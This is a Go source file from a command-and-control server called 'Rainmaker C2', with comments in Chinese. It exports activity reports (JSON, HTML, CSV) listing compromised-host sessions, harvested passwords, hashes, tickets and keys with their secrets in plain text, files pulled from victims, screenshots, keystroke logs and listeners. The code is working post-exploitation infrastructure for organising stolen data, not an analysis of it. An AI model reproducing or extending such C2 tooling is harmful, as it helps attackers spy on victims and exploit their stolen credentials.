// csdev :: report.go  --  活动报告导出 (JSON / 单文件 HTML / CSV)
//
//	GET /api/report/json                                     全量活动快照
//	GET /api/report/html                                     单文件 HTML (内嵌 CSS, 无外部依赖)
//	GET /api/report/csv?kind=sessions|credentials|downloads|events[|screenshots|keylogs]
//
// 三个端点都先过 authCheck: 报告含凭据与截屏索引, 属于最敏感的数据出口,
// 因此默认 fail-closed (未认证 401 / 权限不足 403), -auth=off 时自动旁路。
//
// CSV 一律 UTF-8 带 BOM, Excel 双击即可正确识别中文。
package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"time"
)

// ---------------------------------------------------------------- 快照

// reportSnapshot 报告主体。JSON 端点直接序列化本结构, HTML/CSV 端点复用其字段。
type reportSnapshot struct {
	OK          bool                     `json:"ok"`
	Generated   string                   `json:"generated"`    // 生成时间 (本地可读)
	GeneratedAt int64                    `json:"generated_at"` // 生成时间 (Unix 秒)
	Server      string                   `json:"server"`
	Profile     string                   `json:"profile"`
	Stats       map[string]int           `json:"stats"`
	Sessions    []map[string]interface{} `json:"sessions"`
	Listeners   []ListenerInfo           `json:"listeners"`
	Credentials []Credential             `json:"credentials"`
	Downloads   []Download               `json:"downloads"`
	Screenshots []Screenshot             `json:"screenshots"`
	Keylogs     []Keystroke              `json:"keylogs"`
	Events      []Event                  `json:"events"`
	Targets     []Target                 `json:"targets"`
	Proxy       map[string]interface{}   `json:"proxy"`
}

// buildSnapshot 汇总当前全量活动状态。
func buildSnapshot() reportSnapshot {
	now := time.Now().Unix()
	snap := reportSnapshot{
		OK:          true,
		Generated:   tsText(now),
		GeneratedAt: now,
		Server:      serverAddr,
		Profile:     currentProfileName(),
		Sessions:    sessionsRows(),
		Listeners:   listenerList(),
		Credentials: storeCreds(),
		Downloads:   storeDownloads(),
		Screenshots: storeScreenshots(),
		Keylogs:     storeKeylogs(),
		Events:      eventsAscending(),
		Targets:     storeTargets(),
		Proxy:       proxyList(),
	}
	snap.Stats = map[string]int{
		"sessions":    len(snap.Sessions),
		"listeners":   len(snap.Listeners),
		"credentials": len(snap.Credentials),
		"downloads":   len(snap.Downloads),
		"screenshots": len(snap.Screenshots),
		"keylogs":     len(snap.Keylogs),
		"events":      len(snap.Events),
		"targets":     len(snap.Targets),
	}
	return snap
}

// eventsAscending 事件日志按时间正序 (storeEvents 返回的是倒序, 报告需要正序)。
func eventsAscending() []Event {
	desc := storeEvents(0)
	out := make([]Event, 0, len(desc))
	for i := len(desc) - 1; i >= 0; i-- {
		out = append(out, desc[i])
	}
	return out
}

// mstr 从会话行 (map) 中安全取字符串值; 缺失或 nil 返回空串。
func mstr(m map[string]interface{}, k string) string {
	v, ok := m[k]
	if !ok || v == nil {
		return ""
	}
	return fmt.Sprintf("%v", v)
}

// ---------------------------------------------------------------- 转义

// htmlEscape 单遍转义 HTML 特殊字符; 单遍扫描天然避免二次转义 (& → &amp;)。
func htmlEscape(s string) string {
	if !strings.ContainsAny(s, `&<>"'`) {
		return s
	}
	var b strings.Builder
	b.Grow(len(s) + 16)
	for _, r := range s {
		switch r {
		case '&':
			b.WriteString("&amp;")
		case '<':
			b.WriteString("&lt;")
		case '>':
			b.WriteString("&gt;")
		case '"':
			b.WriteString("&quot;")
		case '\'':
			b.WriteString("&#39;")
		default:
			b.WriteRune(r)
		}
	}
	return b.String()
}

// csvEscape 按 RFC 4180 转义: 含逗号/引号/回车/换行时必须用双引号包裹,
// 内部引号翻倍; 首尾有空白也包裹, 否则 Excel 会吃掉内容里的空格。
func csvEscape(s string) string {
	if s == "" {
		return ""
	}
	need := strings.ContainsAny(s, ",\"\r\n")
	if !need && strings.TrimSpace(s) != s {
		need = true
	}
	if !need {
		return s
	}
	return `"` + strings.ReplaceAll(s, `"`, `""`) + `"`
}

// csvRow 拼一行 CSV, 以 CRLF 结尾 (RFC 4180, Excel 兼容)。
func csvRow(fields ...string) string {
	var b strings.Builder
	for i, f := range fields {
		if i > 0 {
			b.WriteByte(',')
		}
		b.WriteString(csvEscape(f))
	}
	b.WriteString("\r\n")
	return b.String()
}

// credKindText 凭据类型中文名; 取值对应 proto 包 CredKindName 的枚举。
func credKindText(k uint8) string {
	switch k {
	case 1:
		return "口令"
	case 2:
		return "哈希"
	case 3:
		return "票据"
	case 4:
		return "密钥"
	}
	return "其它(" + strconv.Itoa(int(k)) + ")"
}

// ---------------------------------------------------------------- JSON

func handleReportJSON(w http.ResponseWriter, r *http.Request) {
	if _, ok := authCheck(w, r, false); !ok {
		return
	}
	writeJSON(w, buildSnapshot())
}

// ---------------------------------------------------------------- CSV

// csvBOM UTF-8 BOM: Excel 依赖它识别中文编码。
var csvBOM = []byte{0xEF, 0xBB, 0xBF}

// reportCSVKinds 支持的导出类型 (前四个为契约值, 后两个为同类数据的补全)。
var reportCSVKinds = []string{"sessions", "credentials", "downloads", "events", "screenshots", "keylogs", "jobs"}

func handleReportCSV(w http.ResponseWriter, r *http.Request) {
	if _, ok := authCheck(w, r, false); !ok {
		return
	}
	kind := strings.ToLower(strings.TrimSpace(r.URL.Query().Get("kind")))
	if kind == "" {
		kind = "sessions"
	}
	lines, ok := csvLines(kind)
	if !ok {
		w.Header().Set("Content-Type", "application/json; charset=utf-8")
		w.WriteHeader(http.StatusBadRequest)
		_ = json.NewEncoder(w).Encode(map[string]interface{}{
			"ok": false, "error": "未知 kind: " + kind, "kinds": reportCSVKinds,
		})
		return
	}
	w.Header().Set("Content-Type", "text/csv; charset=utf-8")
	w.Header().Set("Content-Disposition",
		fmt.Sprintf(`attachment; filename="csdev-%s-%d.csv"`, kind, time.Now().Unix()))
	_, _ = w.Write(csvBOM)
	for _, line := range lines {
		_, _ = w.Write([]byte(line))
	}
}

// csvLines 生成指定类别的表头 + 数据行。
func csvLines(kind string) ([]string, bool) {
	switch kind {
	case "sessions":
		out := []string{csvRow("会话ID", "协议", "主机", "用户", "架构", "来源地址",
			"空闲秒", "有待办任务", "PID", "进程", "系统", "休眠毫秒", "抖动百分比")}
		for _, s := range sessionsRows() {
			out = append(out, csvRow(
				mstr(s, "sid"), mstr(s, "proto"), mstr(s, "host"), mstr(s, "user"),
				mstr(s, "arch"), mstr(s, "addr"), mstr(s, "idle"), mstr(s, "has_task"),
				mstr(s, "pid"), mstr(s, "proc"), mstr(s, "os"), mstr(s, "sleep"), mstr(s, "jitter"),
			))
		}
		return out, true

	case "credentials":
		out := []string{csvRow("编号", "会话", "凭据类型", "用户名", "机密", "来源", "时间")}
		for _, c := range storeCreds() {
			out = append(out, csvRow(
				strconv.FormatUint(c.ID, 10), c.SID, credKindText(c.CredK),
				c.User, c.Secret, c.Source, tsText(c.TS),
			))
		}
		return out, true

	case "downloads":
		out := []string{csvRow("编号", "会话", "文件名", "本地路径", "远端路径", "字节数", "时间")}
		for _, d := range storeDownloads() {
			out = append(out, csvRow(
				strconv.FormatUint(d.ID, 10), d.SID, d.Name, d.Path, d.RemotePath,
				strconv.FormatInt(d.Size, 10), tsText(d.TS),
			))
		}
		return out, true

	case "events":
		out := []string{csvRow("编号", "类别", "会话", "动作", "详情", "时间")}
		for _, e := range eventsAscending() {
			out = append(out, csvRow(
				strconv.FormatUint(e.ID, 10), e.Cat, e.SID, e.Action, e.Detail, tsText(e.TS),
			))
		}
		return out, true

	case "screenshots":
		out := []string{csvRow("编号", "会话", "路径", "字节数", "时间")}
		for _, s := range storeScreenshots() {
			out = append(out, csvRow(
				strconv.FormatUint(s.ID, 10), s.SID, s.Path,
				strconv.FormatInt(s.Size, 10), tsText(s.TS),
			))
		}
		return out, true

	case "keylogs":
		out := []string{csvRow("编号", "会话", "内容", "来源", "时间")}
		for _, k := range storeKeylogs() {
			out = append(out, csvRow(
				strconv.FormatUint(k.ID, 10), k.SID, k.Text, k.Source, tsText(k.TS),
			))
		}
		return out, true

	case "jobs":
		out := []string{csvRow("作业号", "会话", "类型", "详情", "状态", "可终止", "任务号", "开始", "结束", "备注")}
		for _, j := range bgJobAll() {
			kill := "否"
			if j.Killable {
				kill = "是"
			}
			task := ""
			if j.TaskID != 0 {
				task = strconv.FormatUint(uint64(j.TaskID), 10)
			}
			out = append(out, csvRow(
				j.ID, j.SID, j.Kind, j.Detail, j.Status, kill, task,
				tsText(j.Started), tsText(j.Ended), j.Note,
			))
		}
		return out, true
	}
	return nil, false
}

// ---------------------------------------------------------------- HTML

func handleReportHTML(w http.ResponseWriter, r *http.Request) {
	if _, ok := authCheck(w, r, false); !ok {
		return
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	_, _ = w.Write([]byte(buildHTMLReport(buildSnapshot())))
}

// htmlTable 生成一张表格; 所有内容经 htmlEscape, 空数据给出占位提示。
func htmlTable(title string, headers []string, rows [][]string) string {
	var b strings.Builder
	b.WriteString("<section><h2>" + htmlEscape(title) + "</h2>")
	if len(rows) == 0 {
		b.WriteString(`<p class="empty">（无数据）</p></section>` + "\n")
		return b.String()
	}
	b.WriteString(`<div class="tw"><table><thead><tr>`)
	for _, h := range headers {
		b.WriteString("<th>" + htmlEscape(h) + "</th>")
	}
	b.WriteString("</tr></thead><tbody>")
	for _, row := range rows {
		b.WriteString("<tr>")
		for _, c := range row {
			b.WriteString("<td>" + htmlEscape(c) + "</td>")
		}
		b.WriteString("</tr>")
	}
	b.WriteString("</tbody></table></div></section>\n")
	return b.String()
}

// buildHTMLReport 生成单文件 HTML: 内嵌 CSS, 无脚本、无外部资源。
func buildHTMLReport(snap reportSnapshot) string {
	var b strings.Builder

	b.WriteString("<!doctype html>\n<html lang=\"zh-CN\">\n<head>\n")
	b.WriteString("<meta charset=\"utf-8\">\n")
	b.WriteString("<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n")
	b.WriteString("<title>Rainmaker C2 活动报告</title>\n<style>")
	b.WriteString(reportCSS)
	b.WriteString("</style>\n</head>\n<body>\n")

	b.WriteString("<header><h1>Rainmaker C2 活动报告</h1><p class=\"meta\">")
	b.WriteString("生成时间: " + htmlEscape(snap.Generated))
	b.WriteString(" &nbsp;|&nbsp; 服务端: " + htmlEscape(snap.Server))
	b.WriteString(" &nbsp;|&nbsp; Profile: " + htmlEscape(snap.Profile))
	b.WriteString("</p></header>\n<main>\n")

	// 统计卡片
	b.WriteString("<section><h2>统计概览</h2><div class=\"cards\">")
	cards := []struct{ key, label string }{
		{"sessions", "会话"}, {"listeners", "监听器"}, {"credentials", "凭据"},
		{"downloads", "下载"}, {"screenshots", "截屏"}, {"keylogs", "键盘记录"},
		{"events", "事件日志"},
	}
	for _, c := range cards {
		fmt.Fprintf(&b, `<div class="card"><span class="n">%d</span><span class="l">%s</span></div>`,
			snap.Stats[c.key], htmlEscape(c.label))
	}
	b.WriteString("</div></section>\n")

	// 会话
	rows := [][]string{}
	for _, s := range snap.Sessions {
		rows = append(rows, []string{
			mstr(s, "sid"), mstr(s, "proto"), mstr(s, "host"), mstr(s, "user"),
			mstr(s, "arch"), mstr(s, "addr"), mstr(s, "idle"), mstr(s, "pid"),
			mstr(s, "proc"), mstr(s, "os"), mstr(s, "sleep"), mstr(s, "jitter"),
		})
	}
	b.WriteString(htmlTable("会话",
		[]string{"会话 ID", "协议", "主机", "用户", "架构", "来源地址", "空闲(秒)", "PID", "进程", "系统", "休眠(ms)", "抖动(%)"},
		rows))

	// 监听器
	rows = [][]string{}
	for _, l := range snap.Listeners {
		up := "停止"
		if l.Up {
			up = "运行"
		}
		rows = append(rows, []string{
			l.Name, l.Proto, l.Type, l.Host, strconv.Itoa(l.Port), l.URI, up,
		})
	}
	b.WriteString(htmlTable("监听器",
		[]string{"名称", "协议", "类型", "地址", "端口", "URI", "状态"}, rows))

	// 凭据
	rows = [][]string{}
	for _, c := range snap.Credentials {
		rows = append(rows, []string{
			strconv.FormatUint(c.ID, 10), c.SID, credKindText(c.CredK),
			c.User, c.Secret, c.Source, tsText(c.TS),
		})
	}
	b.WriteString(htmlTable("凭据", []string{"编号", "会话", "类型", "用户名", "机密", "来源", "时间"}, rows))

	// 下载
	rows = [][]string{}
	for _, d := range snap.Downloads {
		rows = append(rows, []string{
			strconv.FormatUint(d.ID, 10), d.SID, d.Name, d.RemotePath, d.Path,
			strconv.FormatInt(d.Size, 10), tsText(d.TS),
		})
	}
	b.WriteString(htmlTable("下载文件", []string{"编号", "会话", "文件名", "远端路径", "本地路径", "字节数", "时间"}, rows))

	// 截屏
	rows = [][]string{}
	for _, s := range snap.Screenshots {
		rows = append(rows, []string{
			strconv.FormatUint(s.ID, 10), s.SID, s.Path,
			strconv.FormatInt(s.Size, 10), tsText(s.TS),
		})
	}
	b.WriteString(htmlTable("截屏", []string{"编号", "会话", "路径", "字节数", "时间"}, rows))

	// 键盘记录
	rows = [][]string{}
	for _, k := range snap.Keylogs {
		rows = append(rows, []string{
			strconv.FormatUint(k.ID, 10), k.SID, k.Text, k.Source, tsText(k.TS),
		})
	}
	b.WriteString(htmlTable("键盘记录", []string{"编号", "会话", "内容", "来源", "时间"}, rows))

	// 事件日志
	rows = [][]string{}
	for _, e := range snap.Events {
		rows = append(rows, []string{
			strconv.FormatUint(e.ID, 10), e.Cat, e.SID, e.Action, e.Detail, tsText(e.TS),
		})
	}
	b.WriteString(htmlTable("事件日志", []string{"编号", "类别", "会话", "动作", "详情", "时间"}, rows))

	b.WriteString("</main>\n")
	b.WriteString("<footer>Rainmaker C2 服务端生成 · 本文件自包含, 不含外部资源。</footer>\n")
	b.WriteString("</body>\n</html>\n")
	return b.String()
}

// reportCSS 内嵌样式: 浅色、适合打印与归档, 表格在窄屏可横向滚动。
const reportCSS = `
:root{--bg:#eef1f5;--card:#fff;--ink:#161b22;--dim:#5a6675;--line:#d8dee6;--accent:#0b62c4;--num:#c2410c}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--ink);font:14px/1.6 "Segoe UI","Microsoft YaHei","PingFang SC",sans-serif}
header{background:linear-gradient(120deg,#0d1620,#1b3348 58%,#123047);color:#eaf1f8;padding:30px 34px 26px}
header h1{margin:0 0 8px;font-size:22px;font-weight:650;letter-spacing:.5px}
header .meta{margin:0;color:#9fb6cc;font-size:13px}
main{max-width:1500px;margin:0 auto;padding:6px 34px 40px}
section{margin:0 0 22px}
h2{font-size:15px;margin:22px 0 10px;padding-left:10px;border-left:4px solid var(--accent);letter-spacing:.4px}
.cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px}
.card{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:14px 16px;display:flex;flex-direction:column}
.card .n{font-size:26px;font-weight:700;color:var(--num);line-height:1.15}
.card .l{font-size:12px;color:var(--dim)}
.tw{overflow-x:auto;border:1px solid var(--line);border-radius:10px;background:var(--card)}
table{width:100%;border-collapse:collapse;font-size:13px}
th{background:#f3f6f9;text-align:left;padding:9px 12px;border-bottom:1px solid var(--line);white-space:nowrap;color:#33414f;font-weight:600}
td{padding:8px 12px;border-bottom:1px solid #eef2f6;vertical-align:top;word-break:break-all}
tbody tr:nth-child(even){background:#fafcfe}
tbody tr:last-child td{border-bottom:none}
.empty{color:var(--dim);background:var(--card);border:1px dashed var(--line);border-radius:10px;padding:14px 16px;margin:0}
footer{max-width:1500px;margin:0 auto;padding:0 34px 40px;color:var(--dim);font-size:12px}
@media print{header{background:#0d1620}body{background:#fff}}
`

// RegisterReportRoutes 由 main 调用: 注册报告导出端点。
// 端点内部已做 authCheck, 因此无需再套 requireAuth (避免重复校验)。
func RegisterReportRoutes(mux *http.ServeMux) {
	mux.HandleFunc("/api/report/json", handleReportJSON)
	mux.HandleFunc("/api/report/html", handleReportHTML)
	mux.HandleFunc("/api/report/csv", handleReportCSV)

	logf("[*] 报告导出: /api/report/json | /api/report/html | /api/report/csv?kind=%s",
		strings.Join(reportCSVKinds, "|"))
}
